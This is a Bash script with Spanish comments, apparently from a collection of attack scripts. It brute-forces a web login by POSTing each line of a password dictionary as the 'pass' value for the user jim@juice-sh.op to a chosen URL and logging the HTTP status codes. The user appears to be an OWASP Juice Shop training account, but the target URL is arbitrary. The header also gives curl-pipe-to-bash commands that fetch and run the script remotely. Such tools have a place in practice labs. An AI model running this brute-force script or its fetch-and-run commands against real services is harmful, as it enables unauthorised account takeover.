#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para inyectar un valor JSON a la fuerza, con method POST, en una API web determinada
#
# Ejecución remota con parámetros:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web-POST-FuerzaBruta.sh | bash -s [URL] [Diccionario]
#
# Ejecución remota como root (para sistemas sin sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web-POST-FuerzaBruta.sh | sed 's-sudo--g' | bash -s [URL] [Diccionario]
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web-POST-FuerzaBruta.sh | nano -
# ----------

# Definir constantes de color
  cColorAzul='\033[0;34m'
  cColorAzulClaro='\033[1;34m'
  cColorVerde='\033[1;32m'
  cColorRojo='\033[1;31m'
  # Para el color rojo también:
    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
  cFinColor='\033[0m'


if [ "$#" -ne 2 ]; then
  echo "Uso: $0 <URL> <archivo>"
  exit 1
fi

URL="$1"
vArchDict="$2"

if [ ! -f "$vArchDict" ]; then
  echo "Error: El archivo '$vArchDict' no existe."
  exit 1
fi

contador=0

while IFS= read -r linea; do
  # Saltar líneas vacías
  if [ -z "$linea" ]; then
    continue
  fi
  contador=$((contador + 1))
  # Construir el JSON con el valor inyectado
  payload=$(printf '{"user":"jim@juice-sh.op","pass":"%s"}' "$linea")
  # Enviar la petición POST
  codigo_http=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d "$payload" "$URL")
  echo "Inyección $contador: Valor '$linea' -> Código HTTP $codigo_http"
done < "$vArchDict"
